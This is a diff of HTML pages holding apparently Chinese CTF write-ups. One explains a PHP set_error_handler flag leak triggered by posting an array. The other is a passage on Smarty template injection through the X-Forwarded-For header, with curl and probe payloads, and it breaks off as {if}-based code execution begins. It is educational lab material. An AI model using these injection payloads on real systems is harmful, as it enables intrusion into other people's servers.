+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0
 </span></code></pre></div>
 <p><strong>本地构造时要按目标类的真实可见性来写</strong>，否则反序列化出来的属性是“同名但不是同一个”，魔术方法里读到的会是你没设置的那个。</p>
 </details>
@@ -4226,39 +4226,39 @@
 <hr />
 <h3 id="_2"><a class="toclink" href="../../ctf2-ezphp-error-handler/#_2">解题过程</a></h3>
 <h4 id="step-1"><a class="toclink" href="../../ctf2-ezphp-error-handler/#step-1">Step 1：先读代码</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
-</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
-</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
-</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
-</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="p">}</span>
-</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>
-</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="nb">set_error_handler</span><span class="p">(</span>
-</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>    <span class="p">}</span>
-</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="p">);</span>
-</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
-</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="p">}</span>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="nb">set_error_handler</span><span class="p">(</span>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>    <span class="p">}</span>
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="p">);</span>
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
+</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 <h4 id="step-2-if"><a class="toclink" href="../../ctf2-ezphp-error-handler/#step-2-if">Step 2：第一个想法——绕开那个 if</a></h4>
 <p><strong><code>include</code> 已经把 <code>fl4g.php</code> 引进来了，那直接让 <code>if</code> 成立不就能输出 <code>$fl4g</code> 了吗？</strong></p>
 <p><strong>看三个判断：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>date("H")   小时   00–23     永远不可能 &gt; 24
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>date("d")   日期   01–31     永远不可能 &gt; 31
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>date("i")   分钟   00–59     永远不可能 &gt; 60
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>date("H")   小时   00–23     永远不可能 &gt; 24
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>date("d")   日期   01–31     永远不可能 &gt; 31
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>date("i")   分钟   00–59     永远不可能 &gt; 60
 </span></code></pre></div>
 <p><strong>三个都是“边界值本身等于上限”的情况，所以整条 <code>or</code> 永远是假。这条路封死。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../ctf2-ezphp-error-handler/#step-3">Step 3：真正的入口在下面</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x">set_error_handler(function() use(&amp;$fl4g){ print $fl4g; });</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="x">$fl4g .= $dest0g3;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="x">set_error_handler(function() use(&amp;$fl4g){ print $fl4g; });</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="x">$fl4g .= $dest0g3;</span>
 </span></code></pre></div>
 <p><strong><code>set_error_handler</code> 注册了一个自定义处理器——</strong>只要发生能被它捕获的错误，就会执行里面的 <code>print $fl4g</code><strong>。</strong></p>
 <p><strong>而下一行就是触发器：<code>$fl4g .= $dest0g3</code>。</strong></p>
@@ -4267,17 +4267,17 @@
 <p><strong>如果传一个</strong>字符串<strong>，拼接正常，什么都不会发生。</strong></p>
 <p><strong>如果传一个</strong>数组<strong>，PHP 试图把数组转成字符串来拼接，转不了——抛出 <code>Warning: Array to string conversion</code>。</strong></p>
 <p><strong>这个 warning 被刚刚注册的处理器捕获，于是 <code>print $fl4g</code> 执行，flag 就出来了。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>POST ctf[]=1
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>→ Array to string conversion
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>→ error handler
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>→ 打印 $fl4g
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>POST ctf[]=1
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>→ Array to string conversion
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>→ error handler
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>→ 打印 $fl4g
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../ctf2-ezphp-error-handler/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>读源码 → include 了 fl4g.php，但 if 永远为假（小时≤23、日≤31、分≤59）
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>       → 往下看，set_error_handler 注册了 print $fl4g
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>         → 找触发器：$fl4g .= $_POST['ctf']
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>           → 传数组 → 拼接失败 → warning → 处理器执行 → 拿到 flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>读源码 → include 了 fl4g.php，但 if 永远为假（小时≤23、日≤31、分≤59）
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>       → 往下看，set_error_handler 注册了 print $fl4g
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>         → 找触发器：$fl4g .= $_POST['ctf']
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>           → 传数组 → 拼接失败 → warning → 处理器执行 → 拿到 flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../ctf2-ezphp-error-handler/#_4">漏洞原理</a></h4>
 <p><strong>① 错误处理器会把“错误”变成“输出”</strong></p>
@@ -4321,25 +4321,25 @@
 <hr />
 <details class="note">
 <summary>完整源码</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
-</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
-</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
-</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="p">}</span>
-</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="nb">set_error_handler</span><span class="p">(</span>
-</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>    <span class="p">}</span>
-</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a><span class="p">);</span>
-</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
-</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="p">}</span>
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="nb">set_error_handler</span><span class="p">(</span>
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>    <span class="p">}</span>
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a><span class="p">);</span>
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 </details>
 <details class="note">
@@ -4393,24 +4393,24 @@
 <h3 id="_1"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_1">题目概述</a></h3>
 <p>进入靶场只有两个链接：<code>flag</code> 和 <code>hint</code>。</p>
 <p><code>hint</code> 里没放东西。打开 <code>flag</code>，页面输出：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Your IP is : 10.42.1.78
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Your IP is : 10.42.1.78
 </span></code></pre></div>
 <p><strong>问题来了：它怎么知道我的 IP 的？</strong></p>
 <hr />
 <h3 id="_2"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_2">解题过程</a></h3>
 <h4 id="step-1-ip-ip"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-1-ip-ip">Step 1：既然它读 IP，那就伪造 IP</a></h4>
 <p><strong>服务器判断"你的 IP"，通常看 <code>X-Forwarded-For</code> 这类头（反向代理会加）。所以先手动改一个试试：</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-k</span> <span class="n">-H</span> <span class="s2">"X-Forwarded-For: TESTIP_9.9.9.9"</span> <span class="s2">"https://…:9999/flag.php"</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-k</span> <span class="n">-H</span> <span class="s2">"X-Forwarded-For: TESTIP_9.9.9.9"</span> <span class="s2">"https://…:9999/flag.php"</span>
 </span></code></pre></div>
 <p><strong>页面真的跟着变了 —— 说明这个头被原样拿来用。</strong></p>
 <p><strong>（这道题的平台给的是裸 TCP 地址，但它其实是个 HTTPS 服务，所以我直接用 <code>https://host:9999/</code> 访问，不需要 nc / openssl。）</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-2">Step 2：改完还能正常输出，那就试模板注入</a></h4>
 <p><strong>先上最基础的探针：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>X-Forwarded-For: {{7*7}}      →  49
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>X-Forwarded-For: {{7*7}}      →  49
 </span></code></pre></div>
 <p><strong>模板被执行了。</strong>但这一刻<strong>不要急着下结论</strong>。</p>
 <h4 id="step-377"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-377">Step 3：<code>{{7*'7'}}</code> 才是分水岭</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>X-Forwarded-For: {{7*'7'}}    →  49
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>X-Forwarded-For: {{7*'7'}}    →  49
 </span></code></pre></div>
 <p><strong>这个结果说明引擎把 <code>'7'</code> 当成数字处理了 —— 那是 PHP 系模板的行为。</strong></p>
 <table>
@@ -4432,59 +4432,59 @@
 </tbody>
 </table>
 <p><strong>所以这不是 Jinja2。看报错也印证了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>Uncaught --&gt; Smarty Compiler: Syntax error in template …
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Uncaught --&gt; Smarty Compiler: Syntax error in template …
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php
 </span></code></pre></div>
 <p><strong><code>sysplugins/smarty_internal_*</code> 就是 Smarty 的源码目录。</strong></p>
 <blockquote>
 <p><strong>这一步我走了弯路：</strong>一开始按题名以为是 Flask 版，直接套 <code>__class__</code> 那条链，结果报错说 Smarty 语法不对。<strong>只测 <code>{{7*7}}</code> 是不够的 —— Jinja 和 Smarty 都回 49。</strong></p>
 </blockquote>
 <h4 id="step-4-smarty"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-4-smarty">Step 4：确认 Smarty 版本</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>X-Forwarded-For: {$smarty.version}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>X-Forwarded-For: {$smarty.version}
 </span></code></pre></div>
 <p><img alt="Smarty 版本" src="../../../assets/images/bjdctf2020-mystery-ip/01-smarty-version.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>Your IP is : 3.1.34-dev-7
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Your IP is : 3.1.34-dev-7
 </span></code></pre></div>
 <p><strong>Smarty 3.1。</strong>这意味着 Smarty 2 时代的 <code>{php}…{/php}</code> 标签<strong>已经被移除了</strong>，那条路走不通。</p>
 <h4 id="step-5smarty-3-if"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-5smarty-3-if">Step 5：Smarty 3 的路子是 <code>{if}</code></a></h4>
 <p><strong>Smarty 的 <code>{if}</code> 表达式最终会被编译成 PHP 的 <code>if (...)</code>，而表达式里的函数调用会被原样写进编译结果。</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="x">// {if phpinfo()}{/if}  编译后大致是：</span>
